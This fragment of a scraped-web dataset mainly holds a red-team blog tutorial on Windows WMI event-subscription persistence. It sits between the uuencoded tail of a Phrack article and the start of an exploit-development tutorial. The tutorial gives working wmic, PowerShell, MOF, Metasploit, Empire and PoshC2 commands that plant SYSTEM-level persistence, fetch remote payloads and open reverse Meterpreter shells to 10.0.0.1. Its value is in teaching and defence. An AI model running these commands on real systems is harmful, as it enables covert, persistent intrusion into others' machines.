'UI!7ZDSM4@`C3KAK\/8Z\nMO$02VMAQ'\/Z.SN\/PX'M7='8X91'A]8-F5W]=N'B]+<,,Y?MPF`63RBVPH:ZJ\nME0)<^]%8UX.HD^_B3#^*S:U6O=GMU5N-1KT)6)\/0#E?W&'+@@-9>Z_4<\\F7M\nMK&239-P-&6AYS*R\/9<T`,M\/\"80(#7HLC&LT6-.8),1R<X&?W^_W3@Z,WAU4T\nM+=-3$>9MN2S)(SV?D@IY3A$U(9%&L@$%D3$F5;R<6TJQ$81^#6@D80#A])Y6\nML85BVJ'PLVO6_P<>MO_VO7@1+NY^&_\/O!^R_VXU.LZO]OW39_AO#P#[;?W^%\nM1_I_T00@G%H--E.'Z$%\"M.J=>JLEUOG#AA#OWNR=G;OOSMX>')[W3Y75MC0\"\nM_XVLP#_'#%R(XO%X6!27@8>;P5$$8L8-5KM3%A:T&\"YGFK%R3W5SL+R`5^@G\nM8'`')0(?=E71#$\/ER(J@>S-8FCS_$J\\6#;'6?V*<'70J,;VK4L#+E[&XN83B\nM8A2,%S+J:R0X\/!,TO5VFNGZ$J@;H-PS0YJE])#H`89LR\"I,)Q?2K^'(2#EUY\nMO4OU+.\\=\"B_7Z)Y'^CU(BM`EH8K<1,NB^-8-9SZ[Q,+TRXDK'6.ELA)P%6._\nMCEDQ46;]4*_7\/]X'&2\"KJ_8#M&O$,;X(%K&^XSH$K.+@7;&XR)N:&A2Z\"*;!\nM''T$`.:#,G<&2]\\`87E$,#[?4@MG[B264>MEK2BN`\"X&A.H;&*``?1G153\\H\nM3G[A20)7[MS*=378<XHUBZ+U,`2AXQH]U.#]T,5EM,3U$AT=P4),9'PQ0ADB\nMGOO8%L\/C81@8ZD&[90*#IH0Q]X&B,7G^\/!+?G1Z_Q[OT2(=T1;)4%@$:FLNA\nM](`N8I@QUP&;GU>I_S$05O!RCG[QENA0`>EV6Y,'\"@79>B_B4>VU!A>7>I`B\nM\\-HZDX<C8+$'4:=\/E_H,,KB(\\&:JC_AUH^6\"WWSB]XJDH\\%U&\"UC$%*G`<Y;\nMJEB4O\"N\/$8Y[%BVYT.%F68[-&\"0S=C&EW>HM9_C5H#X],*)$\\ZV<FHU8T]W,\nMBV7@61@[)B?$<CSV!L!0:CCE,+Q;,%_<T?8`K_41+CUR'P\/YF8`3,`%H\/YH,\nMHKIX2_<I<<;*:+TTNLU&J\\.4J;>]`\"WZE5G.D%@``U#W\/(@OV8,?D3R3L*)[\nMBC3`-(^`QCSYR5T-DI_!#\/D[>3Y!`\"C^;ET<\\'U\/F&S#,9(&O4<ZOZ-VN\"QT\nMK8HD7T3[_R)2E,&V\"?_*]:!BC\\%U.#8QL;B<1\\N+RP15*EB`I.;(0MLB#L9`\nM@2KK(\/`]Q#X30JQ'_!(F<`[URVEX1K-L&@E84[PIUH.1R@D)P+T`JP%,%'2S\nM!Y.8AWRF.!\\Y]X$-OF02\\=+W`]KZ\\Z5,I@RH@,=[.8BQ+[C?QA'`@5L\"]@<+\nMV*%C5@S^7!MY\/E0N(4<@;BY#H+X;&.Z$;BF:!U%'E@ERITH8C'V\"*R+&3`K'\nM&!;0`PHDKDA;<[ZF,4%+S+A<YPEHK6>:\\H=1$*,'R9MH?H4+);<#-<(,0;@)\nM&@]I'KU!1C+FNR>:K9XX;+I$M^@%DKB,I$IYIT,S-V\\AZ9NB92$\/*V%09_)<\nM>8E6V\\&4Z()]=\"KJ40BAP>=-\/G?_&*DUB@,-*RW+\"T]Y90()!?`)_$X&FY94\nM1Y\/'K\/0Z!+:\"2X6$KN2-)U',RA#,+`6>*?%^*\"?EBS+NCCBPN,8BTB\/Z)8\"9\nM$O(M?\"1+\/0%+Q%!HF`G\/24,UV`,NRG4].'B%]C_]N3=;1+\/M?_T!FE^(=43^\nM.I(5.:7]15S,@YF0:QM3'W\\N[;_;*QLK;,\/X@^.E\/G.\"6=+6I\/>VNOAGJV&4\nM;#?4+UDR#6GV^=_X8%XFVA,,X`C[Y$Y5C.I!O:RZW*IWZQ6@`R+#`=X,7W#\\\nMD#OT,X\"H!APMQ[`X(6LB2HWA!8=@@>5O@<P*F>H0DRAV(4T<H(O)<DQ4(:6]\nMO'M_CW:R1ZF7DYS$O)N#D*Y\\`6??8(CRS[IIF.?H#R:;ETK3`9+U#3#778(0\nMX3BF`C.Y4&A+L4ZGEUSV.SYT#\\@%H'7_SW'(O9]*.D76VT<7@L'\"7\\<5]&9(\nM!S3KZ^(L6,C8]EIV(DD0@^K@W$+.!0L0BKTTHCC[:47$-1\"O4!I^5%D#15?5\nM+4TLD+&KPS\\8?2;E&2G#7>$T$_>OI@[4TNNS0D;)IUIEQB='ZQ6Q)]V\/2$V:\nM_=B>8K@J>72E5&SJ\"`JJ.L'7,HAKYF%O\"W:W#:C8$9\"NZ@#E_6FPT\"YD4E6Q\nM1X$3CR0<6CYAMOR?%\"Y>UE,=(,6M>EQWY@T_V!A-SB%45\\NB5LCA`Q)NRIO%\nM3\\Z!!O>P;)^B70`7G[DLFZ-JFTG:>!P02FGK`ZLLN@G&3NOO\\&D8W))>,DT$\nMZ&B!Y*J12VT8F`7^`;M1+TY0BQ50RXZ#[8TPF)510&X=)M*6#Z$R<K\/(O*-S\nMR^''XT;B%+$J<P^(\\3B,%Q^:'W?$RAX:2!-#;P(;-`Q]B*II\/.9RG(I7%97!\nMCO[JP]=A\\A4]V(R2KR#T52Z3KR%\\'6>\"K^``?N@T$\"J8\\W\\GQS?1)+BA31#]\nMVJZ5\"Y_$.-C1AZG.D+P?NB!873GFD2#&>*%K(U5RQ1X;C6-'DJ_#(;J&&RU9\nM38!N+1NW`V]857_6QH'V#NDX&BG.*)K%[CRZ=9*H852CD*B!'\\()_!`RX.<B\nM:16][?`8ZJ1+R$&(@9\\)_$SA)X(?D-\\K_X0?\/5N3(N@O8SF%JF;!T,4@S=@5\nM_S(,ICN)HSP'6:4[D@AB7Z5.93;'\"&N5:7\"[,'!!R#2@G!HOH<-8_85W0><\\\nM\/\\N@U\/Q[32)0?R<H$&6%E'<]FL>HE?G0[+9['9B?=`@%M!WA)6%RWXA'$<\"Y\nM8:H2%[>3NCIA&0)V+T(D.W@*%-:G,L\/$\"LF[.T;;U&^H?QG\/::<]H*,MW68S\nM=<(MY,DMH)`R9EU^UCZ*%S&?6M&)FT.G,?V_'9P;X51-+V?OWY)+P]9&EWL,\nM6P,?18O`1:DL&HUDDQ@DA=K$]1`(9[8C#\\`PVP=9S<>J0.]M^JL\\@D,GBW2*\nM\\OZ$X['1&0H>[?FX;7>CP3]@4P%B[GA'X'G+`!W!E+#BJ@(0N\\+)V(\"1+`J(\nM!L#5B#PV%6V)$OVUSHOJ4$E@QEV>-OI@J50D%3XY?,*Y1A706JTK*1OQY$:X\nM1Y6P*=X.7Y#5-V%2SXQ`<,,(PSHY[+S&B`RJ'@3I6ZZ\/.R7KPR])?=D0N>J1\nMH>[2R=Q>C\/>B1K+BXHM8O%C\"?Z0+`GW-1\/T:X=Z`_!\/NWD\"2P67+G\\QD=XD$\nM3%QPG$^<R-.H-)J5C1I&\\MW,S\"\\\/1@C`7=$6?^9!AZXFT(AM0<?W&*.0_-M%\nM,R9'G'-$DR45*Y%PB)%%AQ]:&VB88B:&1KLL2);.#KY[?W;:K,H)9XTJ#'=)\nMA#1.=+(.%0KM$=9^H#GRYTKTQO)A-7$09E0J<?@M3^=L13\/<])<,I\"6\\Y@'0\nM5D`F<8[PE7>2DW3>2YK.`0TT584O9VGE&@\\[U4O7]>*)ZY;8^ZK0\/E\\;Z+1P\nM6Q0G16!&-C6(M5V1&,KC6?`U'CS+*)S0CE-(=<OH%4K=8EU-@<HU30#NIQ$!\nM4X,.4^=:NNA%5X9K:^):.^B%A+PRNNRK5SN4^Q5[XEWU.5\/!IWO!N+B_U4<T\nM>&_CZI%SJ-:\\#[Y\/R2EDK2G]T](RHBT,4']%*FI1TM84\/!H%\/-\"F=;).K@]W\nMQ9I!0(*DSW7>T\"S0#5^,2B<7L[JS\"U@O!)T(JRHRLD\"J\/CPO)6\\BZJE(52(I\nMKD+4U;\"^31VIB!M\/*2]1=1\/X(9T4X-5Z9MKDSA.51*%5JU[7AKAG<V_F(-NY\nM=:E$(TWDY$Z,O?^ZFZ(LO$`7(:P?HII0.T>*CF*1;KF0RJU8M%JH7%2TUJ0N\nM?L2#CI<3V\/#37H\\VA7_FS6!;>\/5)O0K5LIY(7C&^0_=Q\"Z7WLZI&]0SIBL;+\nMP2\",+[4\"S,BT7B`S,YM7=)1;:\\<9!^0,CGD7KIW,(528PK\/^_W3?O3\\\\\/S@Y\nM\/.B?.NW69K>71S,7N([F[%N@^](4+AP*35(.RT<`N\\L:,#1D@)G=25SDX#YI\nM1T8_=!0)9G>S3H5,>@JI^M;)W\"*GYU8V0H)0-BSX0&6&48RY:ZZ4UR[X&(#W\nM(^''':-0[?4*<Y-4#MNNI'';:?(_:10#)-]7&AR^2I5SYD1#^@1`@7>P9<M*\nM(%>`=W#R1ODDME;-I[5LE'LJ`,MP^\/LT?\/%[-4P]=G[+EC-9_DUZ+HTSOWJ[\nMX7#=YG%HZ,3&77R88YSE&BJ1WP\/4DJ6!@-IQ<RM7RD3='B^BF9B0\"H>L]'\\-\nML#E<@Q0-JV%LW`X#;S@(@E%B\\L0K\"JT9M$`N9XETD<\/<Z?!GF.CT8K()R^7D\nM<L]M\\G'G\"M)+L*\\&#ET54K8ODSF>@UIH>*\/?\\N[?=7]\\<WA\\U)>6B:K950W2\nM0M5238K4`]\"C-U+J!+6!3\/3TW<$^;*=B)7VKQ;7_P\\&A^]W>B=-Q$F7SX=Y?\nMJ%-.49^5%NVWW8XC7W:-5QA>V&DUD]@1:)%WYCA8@4X\\\/#X^<7_8.W3(F18^\nM(Z\/`0?_(?CDH%,C>-KT]@%%#XD&?J^0:.=Q)*;,<&,O`3=P\"5T&&BA<R@0P(\nMJT2=L5070(65M)VJ)48X($?DT(@3FSL-J;&Q@L:,@QJ)G%9PF%3^^Z\/$J!H>\nMB!3SZ\\+\"T\/-%8L,0&+C[M.#0$6,*Z:$1NREEM(GWK*HZK:'->A[,YJ@@<9*Y\nM,A'-*J\/?L_\/3_MZ[*L4R**\"^S\/147W`N5,(%)T#*2-M7BU*J6UJY@YFRRIUW\nM7`J\/VI?S@`\/@8(7$`A,-,W,FF4R(J<=Q#LLN6\/J^K+),SEMS7\\R:IZ04+H$Y\nM#$7\"VR=EE*J8COS0\/H\/+*_\"5%?8'V\"V>X>L7L<R!Q[72;%V\"4DW:-J&\"I81T\nMV8N;2-S(,TAY6,TGDS<!'V#SMB<.;N^*0G*0*IEQ\\>8%=T:PH?HS:L'E)D1W\nM]=6N4)R\/%7LTG1-3^22GM1O0(RJS\/VI0'5X>W[+83[8.R@H%ZL==G&FP0%Z\\\nM\\=B!COP5D!2S**2S\"B'N68JZG?2JX*AU`$G^<@*T6S*$ZBII-WB)>`.D?_[+\nMV??OW%\/+Y%]OR&D*I+9<)=Q;<1\/FXB2MM5%CJBXA2&UM^6)DT*I45Z^@5GR;\nM:$C-$I)2-=J_,&UB(U6SQ7(:9I.`D*\/-<JB',N;2#^9^\/$MX4.[(4>\"I(?=!\nM3@M*655E5?K(,#BGY],]IPZ9G$N\/Y3;2]A8+=\"]&1C@1&^08UE18K0(9Z\/W[\nM@$S<O\/DB9F,EE`2U$8]=C*=G>GT&\\-,+Q0LI4P`>:>W.R;*NLVBN*8W\\=K7L\nMD>[8(8JJAET8M8YF)\",^NI6TD0:0YX-1#8\"$G<,!>S'D:OC(@X`ES&C9L%8S\nMAM&4$PN6D&AGRHB+<G)D4\/<:O=8*419:S9^ZSH\"\"$QL:5%.V\".H>`M`&X[@B\nM,9J'`)CA%#:\"=64.Y#UCNY$I61U<HGIM6A<'(V3%_\"W&C[-Y-\/`&L()-0!J7\nMMG\\WP4O@ZH\/P`@VU,.(#F8F(DCSPJ-&:BF><NK2IB4*CNN!E3$>@\"Z(Q,M8\"\nM0BV.PEMHIU@G,T36?1,U#@(T_4+#K#%:1-R)Z,J[,PSI@.DN,31U>,O6R=@_\nMX+].,F&)<'C2,MZY*9H&R*<=&683\/TNENT3J:]',;!?N(8FGT`0=[OV:8:_5\nMT@\/\/?]7%*1CJPP#UA8@FP-P83:D!FQ?AE&=R>MYIN?XWF0'6AL?:(F4W\/\\Z3\nM\\6%TOJ`VCR5UFR:[)08HO$4.+$T-.ZVP^DA&3F!Y\\H3.O!-58'*I[3`0;^6)\nM^QLZ*\/YN[[NC_K?\\,--UL&OHC!K0UB`>WC`.<.3+B_R7#T9PU\/G\"1:F1VJ4J\nM&(GAW^!E@J!JS,*8C9RWUT4)>HIWSI4%(^JR<;I7$VY`BP'9,M*V;GY7QEA4\nM<M\/Z>]_&>'Z>G^?G^7E^GI_GY_EY?IZ?Y^?Y>7Z>G^?G^7E^GI_GY_EY?IZ?\nHY^?Y>7Z>G^?G^7E^GI_GY_EY?IZ?Y^?Y>7Z>G\\<]_Q=OV)(^``@\"````\n`\nend\n[ [96]News ] [ [97]Paper Feed ] [ [98]Issues ] [ [99]Authors ] [\n[100]Archives ] [ [101]Contact ]\n\u00a9 Copyleft 1985-2021, Phrack Magazine."}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Persistence \u2013 WMI Event\nSubscription Comments Feed [4]alternate [5]alternate [6]Penetration\nTesting Lab [7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]January 21, 2020January 21, 2020\nPersistence \u2013 WMI Event Subscription\nby [28]Administrator.In [29]Persistence.[30]2 Comments on Persistence \u2013\nWMI Event Subscription\nWindows Management Instrumentation (WMI) enables system administrators\nto perform tasks locally and remotely. From the perspective of red\nteaming WMI can be used to perform several activities such as lateral\nmovement, persistence, situational awareness, code execution and as a\n[31]command and control (C2). The fact that WMI is part of Windows that\nexists in almost all windows operating systems (Windows 98- Windows 10)\nallows these offensive activities to stay off the radar of the blue\nteam.\nTypically persistence via WMI event subscription requires creation of\nthe following three classes which are used to store the payload or the\narbitrary command, to specify the event that will trigger the payload\nand to relate the two classes (__EventConsumer &__EventFilter) so\nexecution and trigger to bind together.\n* __EventFilter \/\/ Trigger (new process, failed logon etc.)\n* EventConsumer \/\/ Perform Action (execute payload etc.)\n* __FilterToConsumerBinding \/\/ Binds Filter and Consumer Classes\nImplementation of this technique doesn\u2019t require any toolkit since\nWindows has a utility that can interact with WMI (wmic) and PowerShell\ncan be leveraged as well. However various frameworks such as\nMetasploit, Empire, PoshC2, PowerSploit and multiple PowerShell scripts\nand C# tools can be used to automate this technique providing different\ntriggers and various options for code execution. It should be noted\nthat WMI events run as a SYSTEM, persists across reboots and\nAdministrator level privileges are required to use this technique.\nMOF\nManaged object format (MOF) is the language used to describe CIM\n(Common Information Model) classes. A MOF file typically contains\nstatements. classes and class instances which are added to the WMI\nrepository (OBJECTS.DATA) when the file is compiled (mofcomp.exe can\ncompile MOF files and it is part of Windows). The contents of a MOF\nfile are demonstrated below:\n#PRAGMA NAMESPACE (\"\\\\\\\\.\\\\root\\\\subscription\")\ninstance of CommandLineEventConsumer as $Cons\n{\nName = \"Pentestlab\";\nRunInteractively=false;\nCommandLineTemplate=\"cmd.exe\";\n};\ninstance of __EventFilter as $Filt\n{\nName = \"Pentestlab\";\nEventNamespace = \"root\\\\subscription\";\nQuery =\"SELECT * FROM __InstanceCreationEvent Within 3\"\n\"Where TargetInstance Isa \\\"Win32_Process\\\" \"\n\"And Targetinstance.Name = \\\"notepad.exe\\\" \";\nQueryLanguage = \"WQL\";\n};\ninstance of __FilterToConsumerBinding\n{\nFilter = $Filt;\nConsumer = $Cons;\n};\nThe above MOF file will execute cmd.exe when the notepad.exe process is\ncreated on the system. The MOF file can be deployed on the WMI\nrepository by executing the following command:\nmofcomp.exe .\\wmi.mof\nCompile MOF Files\nAlternatively Metasploit Framework has also capability to generate\nmalicious MOF files. Executing the following command from interactive\nruby console will generate the MOF.\nirb\nputs generate_mof(\"Metasploit1\",\"Metasploit2\")\nGenerate MOF Files \u2013 Metasploit\nThe Microsoft utility \u201cmofcomp.exe\u201d can compile MOF files. The file\nwill automatically stored in the WMI repository and the malicious\npayload\/command will executed automatically.\nmofcomp.exe .\\Metasploit.mof\nCompile MOF \u2013 Metasploit\nIn this case the payload was fetched remote remotely via Metasploit\n\u201cweb_delivery\u201d module by using the regsvr32 method. Immediately a\nMeterpreter session was spawned as soon as the MOF file was compiled.\nMOF Metasploit \u2013 Meterpreter\nEven though that some APT\u2019s groups have used MOF files as a dropper in\norder to achieve persistence over WMI, it is not recommended as a\nmethod. Persistence via WMI event subscription can be achieved by using\ncommon Microsoft utilities and therefore eliminates the need of\ndropping a file into disk.\nCommand Prompt\nInteraction with WMI can be performed through the command prompt as all\nWindows operating systems contain a command line utility (wmic).\nExecution of the following commands will create in the name space of\n\u201croot\\subscription\u201c three events. The arbitrary payload will executed\nwithin 60 seconds every time Windows starts.\nwmic \/NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"PentestLab\n\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __Insta\nnceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData\n_PerfOS_System'\"\nwmic \/NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\n\"PentestLab\", ExecutablePath=\"C:\\Windows\\System32\\pentestlab.exe\",CommandLineTem\nplate=\"C:\\Windows\\System32\\pentestlab.exe\"\nwmic \/NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filt\ner=\"__EventFilter.Name=\\\"PentestLab\\\"\", Consumer=\"CommandLineEventConsumer.Name=\n\\\"PentestLab\\\"\"\nWMI Persistence \u2013 wmic commands\nThe executable will return a Meterpreter session within 60 seconds\nafter every reboot.\nWMI Persistence \u2013 Meterpreter via Event Filter\nPowerShell\nPowerShell contain cmdlets that can query WMI objects and retrieve\ninformation back to the console. The following commands can be used to\nvalidate that the arbitrary events have been created and the malicious\npayload\/command is stored in the WMI repository.\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter\nGet-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding\nGet-WMIObject -Namespace root\\Subscription -Class __EventConsumer\nIt is also possible to implement this technique directly through\nPowerShell. The following script block will execute the arbitrary\nexecutable \u201cpentestlab.exe\u201d within 5 minutes after every boot of\nWindows.\n$FilterArgs = @{name='Pentestlab-WMI';\nEventNameSpace='root\\CimV2';\nQueryLanguage=\"WQL\";\nQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE\nTargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.S\nystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root\/subscription -ClassName __EventFilter -P\nroperty $FilterArgs\n$ConsumerArgs = @{name='Pentestlab-WMI';\nCommandLineTemplate=\"$($Env:SystemRoot)\\System32\\pentestlab.exe\"\n;}\n$Consumer=New-CimInstance -Namespace root\/subscription -ClassName CommandLineEve\nntConsumer -Property $ConsumerArgs\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root\/subscription -ClassNa\nme __FilterToConsumerBinding -Property $FilterToConsumerArgs\nWMI Persistence \u2013 PowerShell\nThe following commands can be executed to perform a cleanup and remove\nthe created WMI objects.\n$EventConsumerToCleanup = Get-WmiObject -Namespace root\/subscription -Class Comm\nandLineEventConsumer -Filter \"Name = 'Pentestlab-WMI'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root\/subscription -Class __Even\ntFilter -Filter \"Name = 'Pentestlab-WMI'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\/subscription -Qu\nery \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __\nFilterToConsumerBinding\"\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n[32]PowerPunch is a collection of PowerShell scripts that contains a\nPowerShell script for persistence over WMI. However the script requires\n[33]Invoke-MetasploitPayload to be loaded in memory as well as the\npayload will be downloaded from a remote location. The Metasploit\nFramework \u201cweb_delivery\u201d module can be configured that will host the\nPowerShell based payload.\nuse exploit\/multi\/script\/web_delivery\nset SRVHOST 0.0.0.0\nset SRVPORT 8443\nset SSL true\nset target 2\nset URIPATH pentestlab\nset payload windows\/x64\/meterpreter\/reverse_tcp\nset LPORT 8888\nset LHOST 10.0.0.1\nrun -j\nWMI Persistence \u2013 PowerShell Payload\nThe following command will register a WMI event subscription and will\nstore the command that will be executed during startup in order to\ncreate fileless persistence.\nImport-Module .\\Invoke-MetasploitPayload.ps1\nImport-Module .\\New-WMIPersistence.ps1\nNew-WMIPersistence -Name Pentestlab -OnStartup -Command \"C:\\Windows\\System32\\Win\ndowsPowerShell\\v1.0\\powershell.exe\" -Arguments \"-Command Invoke-MetasploitPayloa\nd https:\/\/10.0.0.1:8443\/pentestlab\"\nWMI Persistence \u2013 Register Event\nThe payload will be delivered on the target host on during startup.\nWMI Persistence \u2013 Delivery of Payload\nThe [34]Wmi-Persistence is a simple PowerShell script that supports the\nfollowing triggers: Startup, Logon, Interval and Timed. It contains\nthree functions for installation, review and removal of the created WMI\nevents.\nInstall-Persistence -Trigger Startup -Payload \"c:\\windows\\system32\\pentestlab.ex\ne\"\nWMI Event Subscription \u2013 Executable Startup\nThe \u201cstartup\u201d trigger by default will execute the arbitrary payload\nwithin five minutes after startup.\nPersistence WMI Event Subscription \u2013 Meterpreter\n[35]WMI-Persistence is another PowerShell script that can create and\nevent filter that will execute a PowerShell based payload from a remote\nlocation within 5 minutes after every reboot.\nImport-Module .\\WMI-Persistence.ps1\nInstall-Persistence\nWMI Persistence \u2013 SystemUpTime\nThe script contains a function for viewing WMI objects to ensure that\nthe arbitrary classes have been created correctly.\nCheck-WMI\nWMI Persistence \u2013 Check Event Filters\nAfter 5 minutes on the next reboot the payload will be delivered and a\nMeterpreter session will established with the target host.\nWMI Event Subscription \u2013 SystemUpTime Meterpreter\n[36]Rahmat Nurfauzi developed a PowerShell script ([37]WMI-Persistence)\nwhich by default executes an arbitrary command using [38]regsvr32\nmethod in order to run an arbitrary scriptlet from a remote server.\n.\\WMI-Persistence\nWMI-Persistence \u2013 Regsvr32\nThe \u201cGet-WMIObject\u201d cmdlet will ensure that the event filter has been\ncreated since the script doesn\u2019t provide any console output.\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter\nWMI-Persistence \u2013 Check Event Filters\nMetasploit Framework can be used to host the scriptlet and obtain the\nsession. However other command and control frameworks such as PoshC2\nhave similar capability and can capture regsvr32 payloads.\nWMI-Persistence \u2013 Meterpreter via Regsvr32\n[39]PowerLurk is another PowerShell script that supports five triggers.\nThese are: InsertUSB, UserLogon, Timed, Interval and ProcessStart. This\nscript use the WMI repository in order to store a malicious command\nthat will execute an arbitrary script, executable or any other command\nwith arguments. The following function will retrieve all the active WMI\nevent objects.\nGet-WmiEvent\nWMI Event Subscription \u2013 PowerLurk Get-WMIEvent\nExecuting the following command will create an arbitrary event\nsubscription that will execute a malicious payload permanently during\nWindows logon.\nRegister-MaliciousWmiEvent -EventName Logonlog -PermanentCommand \"pentestlab.exe\n\" -Trigger UserLogon -Username any\nWMI Event Subscription \u2013 PowerLurk Meterpreter\nC#\n[40]Dominic Chell developed a C# tool called [41]WMIPersist which can\nbe used directly as an executable on a compromised host or through\nCobalt Strike. The tool will register an event that will execute a\nbase64 VBS payload when a target process is created on the system.\nWMIPersist \u2013 Code\nMetasploit utility \u201cmsfvenom\u201d can generate the required payload but any\nother tool such as [42]unicorn can be used as well.\nmsfvenom -p windows\/x64\/meterpreter\/reverse_tcp -f raw -o payload64.bin LHOST=10\n.0.0.1 LPORT=4444\nMsfvenom \u2013 Generate bin payload\n[43]SharpShooter can be utilized to generate the stageless payload in\nVBS format by using the shellcode raw file produced previously.\npython SharpShooter.py --stageless --dotnetver 2 --payload vbs --output implantv\nbs --rawscfile payload64.bin\nbase64 -i output\/implantvbs.vbs > \/home\/pentestlab.txt\nSharpShooter \u2013 Generate Implant\nThe payload can be embedded into the WMIPersist tool and the csc.exe\nutility (part of .NET framework) can compile the source code in order\nto convert it to an executable.\ncsc.exe WMIPersist.cs \/r:System.Management.Automation.dll\nPersistence WMI Event Subscription \u2013 Compile WMIPersist\nRunning the executable on the target host or through Cobalt Strike\n(execute-assembly option) will create the Event Filter, Event Consumer\nand the subscription.\nPersistence WMI Event Subscription \u2013 WMIPersist\nExecuting the following commands from a PowerShell console will verify\nthat the payload is stored in the \u201c__EventConsumer\u201d and the\n\u201c__EventFilter\u201d has been created.\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter\nGet-WMIObject -Namespace root\\Subscription -Class __EventConsumer\n*\n*\nWhen the notepad.exe process starts the payload will executed and the\ncommunication channel will open. By default this tool is using notepad\nwhich is a common Windows application but the code can be modified to\ntarget any other common process such as word.exe, outlook.exe,\nexcel.exe, calc.exe depending on the information gathered from the host\nduring [44]situational awareness. The Metasploit module \u201cmulti\/handler\u201d\nor any other C2 can be used to capture the session.\nPersistence WMI Event Subscription \u2013 WMIPersist Meterpreter\nPoshC2\n[45]PoshC2 is a Command and Control framework based in PowerShell but\nsupports C# implants and modules to evade EDR products during red team\nengagements. There is a PowerShell module which can deploy the\npersistence technique of WMI event subscription on a target host by\nexecuting a based-64 encoded payload at a specific time.\nInvoke-wmievent -Name Posh -Command \"powershell -enc <payload>\" -Hour 21 -Minute\n11\nPersistence WMI Event \u2013 PoshC2 Module\nWhen the command will executed the WMI event will created and\nautomatically the results of the WMI objects modified will returned\nback on the console screen for verification.\nPersistence WMI Event \u2013 PoshC2 Event Filter\nThe new implant will connect back to the C2 server at the time that it\nwas set.\nPersistence WMI Event \u2013 PoshC2 Implant\nMetasploit\nMetasploit Framework contains a module which performs persistence on\nthe target system over WMI. The module supports different options that\ncan be used to trigger an arbitrary payload to be executed on the\nsystem. By default is is configured to execute the payload when a\nspecific event ID (4625) is created on the system. Other options that\nare supported are execution of payload during logon, after creating a\nspecific process, after a specific time period etc.\nuse exploit\/windows\/local\/wmi_persistence\nset SESSION 1\nset CALLBACK_INTERVAL 60000\nset USERNAME_TRIGGER pentestlab\nset PAYLOAD windows\/meterpreter\/reverse_tcp\nset LHOST 10.0.0.1\nset LPORT 4444\nexploit\nWMI Event Subscription \u2013 Metasploit Module\nThe module will provide the required command that can be used to logon\nover SMB to the host by using a wrong password in order to generate the\nspecified failed logon request. When the command will executed, will\ngenerate the failed logon event which will trigger the payload and a\nMeterpreter session will open.\nsmbclient \\\\\\\\10.0.0.2\\\\C$ -U pentestlab password\nPersistence WMI Event Subscription \u2013 Trigger\nIn vanilla Windows 10 builds both success and failed attempts during\nlogon\/logoff are logged by the system.\nauditpol \/get \/subcategory:Logon\nAudit Policy \u2013 Windows Logon\nEmpire\nPowerShell Empire has two modules which can establish persistence over\nWMI. The following module can execute a payload at a specific daily\ntime, during failed logon and at startup within 5 minutes.\nusemodule persistence\/elevated\/wmi\nset Listener WMI\nset SubName Empire\nset FailedLogon True\nexecute\nPersistence WMI Event Subscription \u2013 Empire Module\nSimilar to Metasploit module a failed SMB connection can be used to\ntrigger the PowerShell based implant when the \u201cFailedLogon\u201d option is\nused. By default this option will return two connections back to the\ncommand and control server.\nPersistence WMI Event Subscription \u2013 Empire Session\nThe \u201cwmi_updater\u201d module has the capability to fetch the payload from a\nremote location instead of storing it in the WMI repository. It will\nregister as \u201cAutoUpdater\u201d and the trigger can be set at a startup or at\na specific time of the day.\nusemodule persistence\/elevated\/wmi_updater*\nToolkit\nThe following table represents the tools that can be used by red teams\nin order to implement the persistence technique of WMI Event\nSubscriptions and the available trigger options for each tool.\nTool                 Language   Trigger\n[46]Metasploit       Ruby       Failed Logon, Process, Startup, Timed\n[47]Empire           PowerShell Failed Logon, Startup, Timed\n[48]SharpSploit      C#         Process\n[49]WMIPersist       C#         Process\n[50]PoshC2           Python3    Timed\n[51]PowerPunch       PowerShell Logon, Startup\n[52]Wmi-Persistence  PowerShell Logon, Startup, Interval, Timed\n[53]PowerLurk        PowerShell USB, Logon, Process, Interval, Timed\n[54]WMI-Persistence  PowerShell Up-time\n[55]WMILogonBackdoor PowerShell Timed, Interval\n[56]WMIBackdoor      PowerShell Timed, Interval\n[57]WMI-Persistence  PowerShell Timed"}
{"text":"[1]FuzzySec\n* [2]Home\n* [3]Tutorials\n* [4]Scripting\n* [5]Exploits\n* [6]Links\n* [7]Patreon\n* [8]Contact\n__________________________________________________________________\n*\n* [9]Home \u00bb\n* [10]Tutorials \u00bb\n* Introduction to Exploit Development\n(BUTTON) [11][become_a_patron_button.png]\nPart 1: Introduction to Exploit Development\nThis is the first part in a (modest) multi-part exploit development\nseries. This part will just cover some basic things like what we need\nto do our work, basic ideas behind exploits and a couple of things to\nkeep in mind if we want to get to and execute our shellcode. These\ntutorials will not cover finding bugs, instead each part will include a\nvulnerable program which needs a specific technique to be successfully\nexploited. In the fullness of time I intend to cover everything 